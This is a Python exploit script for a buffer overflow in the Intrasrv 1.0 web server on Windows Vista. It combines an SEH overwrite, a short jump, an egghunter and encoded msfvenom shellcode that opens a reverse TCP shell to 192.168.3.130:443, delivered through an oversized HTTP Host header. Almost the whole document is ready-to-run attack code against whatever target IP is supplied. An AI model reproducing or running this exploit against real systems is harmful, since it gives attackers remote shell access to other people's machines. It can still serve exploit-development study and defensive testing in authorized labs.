# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: Intrasrv 1.0 Buffer Overflow Exploit, SEH, EGGHUNTER
# OS		: Windows Vista ULTIMATE x86 SP2
# Exploit DB	: https://www.exploit-db.com/exploits/25836/
# Date		: 09/03/2018

import sys
import struct
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 80

try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

# T00W
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=443 -f c -b "\x00\x0a\x0d\xfe" -e x86/shikata_ga_nai
shellcode = ("\xd9\xe1\xd9\x74\x24\xf4\xbd\x24\xeb\xac\xe5\x58\x2b\xc9\xb1"
"\x52\x31\x68\x17\x83\xe8\xfc\x03\x4c\xf8\x4e\x10\x70\x16\x0c"
"\xdb\x88\xe7\x71\x55\x6d\xd6\xb1\x01\xe6\x49\x02\x41\xaa\x65"
"\xe9\x07\x5e\xfd\x9f\x8f\x51\xb6\x2a\xf6\x5c\x47\x06\xca\xff"
"\xcb\x55\x1f\xdf\xf2\x95\x52\x1e\x32\xcb\x9f\x72\xeb\x87\x32"
"\x62\x98\xd2\x8e\x09\xd2\xf3\x96\xee\xa3\xf2\xb7\xa1\xb8\xac"
"\x17\x40\x6c\xc5\x11\x5a\x71\xe0\xe8\xd1\x41\x9e\xea\x33\x98"
"\x5f\x40\x7a\x14\x92\x98\xbb\x93\x4d\xef\xb5\xe7\xf0\xe8\x02"
"\x95\x2e\x7c\x90\x3d\xa4\x26\x7c\xbf\x69\xb0\xf7\xb3\xc6\xb6"
"\x5f\xd0\xd9\x1b\xd4\xec\x52\x9a\x3a\x65\x20\xb9\x9e\x2d\xf2"
"\xa0\x87\x8b\x55\xdc\xd7\x73\x09\x78\x9c\x9e\x5e\xf1\xff\xf6"
"\x93\x38\xff\x06\xbc\x4b\x8c\x34\x63\xe0\x1a\x75\xec\x2e\xdd"
"\x7a\xc7\x97\x71\x85\xe8\xe7\x58\x42\xbc\xb7\xf2\x63\xbd\x53"
"\x02\x8b\x68\xf3\x52\x23\xc3\xb4\x02\x83\xb3\x5c\x48\x0c\xeb"
"\x7d\x73\xc6\x84\x14\x8e\x81\x6a\x40\x93\xd3\x03\x93\x93\xd2"
"\x68\x1a\x75\xbe\x9e\x4b\x2e\x57\x06\xd6\xa4\xc6\xc7\xcc\xc1"
"\xc9\x4c\xe3\x36\x87\xa4\x8e\x24\x70\x45\xc5\x16\xd7\x5a\xf3"
"\x3e\xbb\xc9\x98\xbe\xb2\xf1\x36\xe9\x93\xc4\x4e\x7f\x0e\x7e"
"\xf9\x9d\xd3\xe6\xc2\x25\x08\xdb\xcd\xa4\xdd\x67\xea\xb6\x1b"
"\x67\xb6\xe2\xf3\x3e\x60\x5c\xb2\xe8\xc2\x36\x6c\x46\x8d\xde"
"\xe9\xa4\x0e\x98\xf5\xe0\xf8\x44\x47\x5d\xbd\x7b\x68\x09\x49"
"\x04\x94\xa9\xb6\xdf\x1c\xd9\xfc\x7d\x34\x72\x59\x14\x04\x1f"
"\x5a\xc3\x4b\x26\xd9\xe1\x33\xdd\xc1\x80\x36\x99\x45\x79\x4b"
"\xb2\x23\x7d\xf8\xb3\x61")

#payload =  "A"*5500

# SEH Offset 1557
# nSEH Offset 1553
#

payload = "A"*(1553-46) + "\x90"*7 + egghunter + "\x90"*7

#SEH = "BBBB"
# PPR 0040573D
SEH = p(0x0040573D)

# Jumps back 48 Bytes into the A's, We have just enough space for egghunter
nSEH = "\xEB\xD0\x90\x90"

payload += nSEH + SEH
buffer = "GET / HTTP/1.1\r\n"
buffer += "Host: " + payload + "\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "User-Agent: Mozilla/4.0 (Windows XP 5.1)\r\n"
buffer += "Content-Length: 1048580\r\n\r\n"
#buffer += "T00WT00W" + badchars
buffer += "T00WT00W" + shellcode

print "Sending UB3R Payl0ad :D"
sock.send(buffer)
